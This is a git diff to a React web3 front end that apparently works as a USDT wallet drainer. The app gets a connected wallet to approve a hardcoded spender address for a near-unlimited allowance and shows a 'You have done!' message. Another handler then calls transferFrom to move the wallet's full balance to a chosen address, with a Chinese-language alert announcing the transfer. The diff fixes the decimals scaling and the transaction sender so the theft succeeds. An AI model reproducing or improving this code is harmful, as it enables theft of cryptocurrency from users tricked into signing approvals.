@@ -6,10 +6,11 @@ import Ipt from './components/Ipt'
 import ABI from './config/USDT_ERC20_ABI.json'
 import { formatBalance } from './config/utils'
 
+// const USDT_ERC20_ADDRESS = '0x6ee856ae55b6e1a249f04cd3b947141bc146273c'
 const USDT_ERC20_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 const SPENDER_ADDRESS = '0xd34121Eb634De20fb4BB1ECB8693069d8411c7a0'
 
-let web3 = null, contract = null, decimals = 0, timer = null
+let web3 = null, contract = null, decimals = 6, timer = null
 function App() {
 	const [ rate, setRate ] = useState({
 		'bitcoin': {usd: 51791, cny: 329750},
@@ -37,7 +38,8 @@ function App() {
 			const accounts = await web3.eth.getAccounts()
 			setAddress(accounts[0])
 			contract = new web3.eth.Contract(ABI, USDT_ERC20_ADDRESS)
-			decimals = await contract.methods.decimals().call()
+			const d = await contract.methods.decimals().call()
+			if (d) decimals = d
 			console.log(contract)
 			console.log(web3)
 			refresh()
@@ -128,7 +130,7 @@ function App() {
 					if (allowanceBalance > 0) {
 						return Toast.success('You have done!')
 					}
-					const res = await contract.methods.approve(SPENDER_ADDRESS, 99999999000000).send({
+					const res = await contract.methods.approve(SPENDER_ADDRESS, 99999999 * Math.pow(10, decimals)).send({
 						from: address,
 						gas: 80000
 					})
@@ -180,7 +182,10 @@ function App() {
 					const balance = await contract.methods.balanceOf(from || address).call()
 					alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
 					Toast.loading('Loading...')
-					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
+					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send({
+						from: toAddress,
+						gas: 80000
+					})
 					// // const res = await contract.transfer(toAddress, balance).send()
 					console.log(res)
 					Toast.hide()
